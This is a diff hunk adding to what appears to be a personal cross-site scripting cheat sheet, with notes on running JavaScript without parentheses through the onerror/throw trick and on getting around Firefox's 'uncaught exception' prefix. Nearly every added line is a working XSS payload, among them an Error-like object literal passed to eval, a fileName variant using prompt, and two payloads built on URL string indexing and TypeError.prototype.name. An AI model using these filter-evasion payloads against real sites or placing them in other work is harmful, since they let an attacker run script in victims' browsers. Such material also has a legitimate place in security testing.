@@ -342,6 +342,41 @@ Payload: <script>throw onerror=alert,'some string',123,'haha'</script>
 
 For example: <script>{onerror=eval}throw'=alert\x281337\x29'</script>
 
+# The string sent to eval is "Uncaught=alert(1337)". 
+# This works fine on Chrome but on Firefox the exception gets prefixed with a two word string "uncaught exception" which of course causes a syntax error when evaluated. I started to look for ways around this. 
+
+<> It's worth noting that the onerror/throw trick won't work when executing a throw from the console.
+<> This is because when the throw statement is executed in the console the result is sent to the console and not the exception handler.
+
+# When you use the Error function in Firefox to create an exception it does not contain the "uncaught exception" prefix. But instead, just the string "Error":
+
+Payload: throw new Error("My message")//Error: My message
+
+# I obviously couldn't call the Error function because it requires parentheses but I thought maybe if I use an object literal with the Error prototype that would emulate the behaviour. 
+# This didn't work - Firefox still prefixed it with the same string. 
+# I then used the Hackability Inspector to inspect the Error object to see what properties it had.
+# I added all the properties to the object literal and it worked! One by one I removed a property to find the minimal set of properties required:
+
+Payload: <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+
+# You can use the fileName property to send a second argument on Firefox too:
+
+Payload: <script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
+
+Second Payload: <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+
+Third Payload: <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+
+
+
+
+
+
+
+
+
+
+
 
 
 
